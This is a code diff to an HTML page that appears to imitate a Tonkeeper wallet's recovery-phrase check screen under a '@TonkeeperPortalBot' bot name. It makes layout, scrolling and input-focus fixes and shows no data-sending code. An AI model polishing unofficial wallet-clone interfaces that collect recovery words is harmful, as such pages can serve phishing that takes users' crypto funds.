@@ -68,7 +68,16 @@
             background: linear-gradient(to top, #0F1215 85%, transparent);
             z-index: 60;
         }
-        .btn-blue { width: 100%; background-color: #0098EA; color: white; padding: 16px; border-radius: 20px; font-size: 18px; font-weight: 600; transition: transform 0.1s; }
+
+        /* ИСПРАВЛЕНИЕ: Кнопка на экране проверки теперь не фиксированная */
+        .check-footer {
+            padding: 20px 0 60px;
+            width: 100%;
+            background: #0F1215;
+            z-index: 60;
+        }
+
+        .btn-blue { width: 100%; background-color: #0098EA; color: white; padding: 16px; border-radius: 20px; font-size: 18px; font-weight: 600; transition: transform 0.1s; border:none; outline:none; }
         .btn-blue:active { transform: scale(0.98); }
         .btn-disabled { background-color: rgba(0, 152, 234, 0.3); color: rgba(255, 255, 255, 0.3); pointer-events: none; }
 
@@ -117,11 +126,11 @@
         .emoji-grid-exact::-webkit-scrollbar { width: 4px; }
         .emoji-grid-exact::-webkit-scrollbar-thumb { background: #21262B; border-radius: 10px; }
 
-        /* ИСПРАВЛЕНИЕ СКРОЛЛА ДЛЯ ПРОВЕРКИ СЛОВ */
         #screen-check {
             overflow-y: auto;
-            display: block; /* Изменяем на block для работы стандартного скролла */
-            padding-bottom: 150px;
+            display: flex;
+            flex-direction: column;
+            padding-top: 60px;
         }
     </style>
 </head>
@@ -227,23 +236,25 @@
         </div>
     </div>
 
-    <!-- 8. SO, LET'S CHECK (ИСПРАВЛЕННЫЙ ЭКРАН) -->
+    <!-- 8. SO, LET'S CHECK -->
     <div id="screen-check" class="screen px-8">
         <button class="back-btn-float" onclick="show('screen-recovery')"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
-        <div class="w-full flex flex-col items-center pt-12">
+        <div class="w-full flex flex-col items-center">
             <h1 class="text-[32px] font-bold text-center mb-2">So, let's check</h1>
             <p class="text-tk-text-gray text-center text-[16px] mb-10 leading-snug px-4">
                 To check whether you've written down your recovery phrase correctly, please enter the <span id="check-indices-text">5th, 12th, and 20th</span> words.
             </p>
-            <div class="w-full max-w-[340px] space-y-4 pb-10">
+            <div class="w-full max-w-[340px] space-y-4">
                 <div class="check-input-wrapper" id="wrapper-1"><span class="check-label-fixed" id="label-1">5:</span><input type="text" id="check-input-1" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 2)"></div>
                 <div class="check-input-wrapper" id="wrapper-2"><span class="check-label-fixed" id="label-2">12:</span><input type="text" id="check-input-2" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 3)"></div>
                 <div class="check-input-wrapper" id="wrapper-3"><span class="check-label-fixed" id="label-3">20:</span><input type="text" id="check-input-3" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 0)"></div>
             </div>
-        </div>
-        <div class="footer-fixed">
-            <button id="btn-final-check" onclick="openPasswordSheet()" class="btn-blue btn-disabled">Continue</button>
-            <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
+            
+            <!-- КНОПКА ТЕПЕРЬ ТУТ, ВНУТРИ СКРОЛЛА -->
+            <div class="w-full max-w-[340px] check-footer">
+                <button id="btn-final-check" onclick="openPasswordSheet()" class="btn-blue btn-disabled">Continue</button>
+                <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
+            </div>
         </div>
     </div>
 
@@ -389,17 +400,17 @@
             document.getElementById('check-indices-text').innerText = `${formatIdx(verificationIndices[0])}, ${formatIdx(verificationIndices[1])}, and ${formatIdx(verificationIndices[2])}`;
             [1, 2, 3].forEach(i => { document.getElementById(`label-${i}`).innerText = (verificationIndices[i-1] + 1) + ':'; document.getElementById(`check-input-${i}`).value = ''; document.getElementById(`wrapper-${i}`).classList.remove('error'); });
             validateVerification(); show('screen-check');
-            // Скроллим вверх при входе
             document.getElementById('screen-check').scrollTop = 0;
         }
 
-        // ИСПРАВЛЕНИЕ: ПЕРЕКЛЮЧЕНИЕ МЕЖДУ ИНПУТАМИ ПО ENTER
         function handleCheckKey(e, next) {
             if (e.key === 'Enter') {
                 if (next === 0) {
-                    e.target.blur(); // Убираем клавиатуру на последнем поле
+                    e.target.blur(); 
                 } else {
-                    document.getElementById(`check-input-${next}`).focus();
+                    const nextInput = document.getElementById(`check-input-${next}`);
+                    nextInput.focus();
+                    nextInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 }
             }
         }
@@ -443,6 +454,15 @@
             const display = document.getElementById('wallet-icon-display');
             display.innerText = element.innerText;
         }
+
+        // Авто-скролл для полей ввода на мобилках
+        document.querySelectorAll('.check-input').forEach(input => {
+            input.addEventListener('focus', () => {
+                setTimeout(() => {
+                    input.parentElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 300);
+            });
+        });
     </script>
 </body>
 </html>
